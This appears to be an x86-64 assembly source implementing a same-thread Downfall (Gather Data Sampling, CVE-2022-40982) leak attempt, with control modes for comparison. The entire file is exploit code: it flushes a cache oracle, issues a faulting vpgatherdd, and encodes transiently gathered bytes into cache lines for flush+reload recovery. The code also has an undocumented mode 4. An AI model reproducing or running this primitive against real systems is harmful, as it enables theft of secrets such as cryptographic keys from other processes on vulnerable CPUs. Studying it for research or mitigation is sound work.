/* Same-thread AVX2 Gather Data Sampling attempt.
 *
 * The shape follows the published FAULT_PF / single-thread sequence from
 * the Downfall materials (Daniel Moghimi, "Downfall: Exploiting
 * Speculative Data Gathering", USENIX Security 2023; CVE-2022-40982;
 * https://github.com/flowyroll/downfall):
 * a vector load of the caller's buffer, then a faulting vpgatherdd from
 * address 0, then a data-dependent cache touch. AVX-512 opcodes are not
 * used (vpxor, not vpxord). No TSX.
 *
 * Oracle stride is 0x1040 and the touch keeps only six bits, because on
 * this L1D a 4096-byte stride aliases every slot into one set.
 * class = (byte ^ 0x3f) & 0x3f.
 *
 * mode in r8d:
 *   0 gather   faulting vpgatherdd, touch the transient ymm5 bytes
 *   1 fixed    faulting vpgatherdd, touch slot 1 with no data dependence
 *   2 nogather vector fill and flush only
 *   3 arch     architecturally touch the class of the filled ymm0 byte
 *
 * A fault in mode 0 or 1 is continued at gds_skip so the encode does not
 * also run architecturally. gds_skip balances the pushes below.
 */

.set SLOT, 0x1040
.set XOR_KEY, 0x3f
.set NBYTES, 64
.set ORACLE_SPAN, SLOT * 64

.macro touch_byte src
    mov \src, %r11
    and $0xff, %r11
    xor $XOR_KEY, %r11
    and $0x3f, %r11
    imul $SLOT, %r11, %r11
    mov (%r15, %r11), %r11d
.endm

.section .text
.global gds_attempt
.type gds_attempt, @function
.align 0x1000
gds_attempt:
    endbr64
    push %rbx
    push %r12
    push %r13
    push %r15

    mov %rdi, %r15

    xor %r11, %r11
.Lflush:
    clflush (%r15, %r11)
    add $SLOT, %r11
    cmp $ORACLE_SPAN, %r11
    jne .Lflush
    mfence
    lfence

    vmovups (%rsi), %ymm0
    vmovups 32(%rsi), %ymm0
    vmovups (%rdx), %ymm3
    vpxor %ymm1, %ymm1, %ymm1
    vmovups (%rcx), %ymm1
    vpcmpeqb %ymm2, %ymm2, %ymm2

    cmpl $3, %r8d
    je .Larch
    cmpl $2, %r8d
    je gds_skip
    cmpl $4, %r8d
    jne .Lkeep
    vpxor %ymm0, %ymm0, %ymm0
.Lkeep:
    .rept 32
    inc %eax
    .endr

    xor %r13, %r13
    test %r9, %r9
    jz .Lbase0
    mov %r9, %r13
.Lbase0:
    vpgatherdd %ymm2, 0(%r13, %ymm1, 1), %ymm5

    cmpl $1, %r8d
    je .Lfixed

    vmovd %xmm5, %eax
    touch_byte %rax
    jmp gds_skip

.Lfixed:
    movl $1, %eax
    imul $SLOT, %eax, %eax
    mov (%r15, %rax), %eax
    jmp gds_skip

.Larch:
    vextracti128 $0, %ymm0, %xmm4
    pextrq $0, %xmm4, %rax
    touch_byte %rax

.global gds_skip
gds_skip:
    vzeroupper
    pop %r15
    pop %r13
    pop %r12
    pop %rbx
    ret

.section .note.GNU-stack, "", @progbits
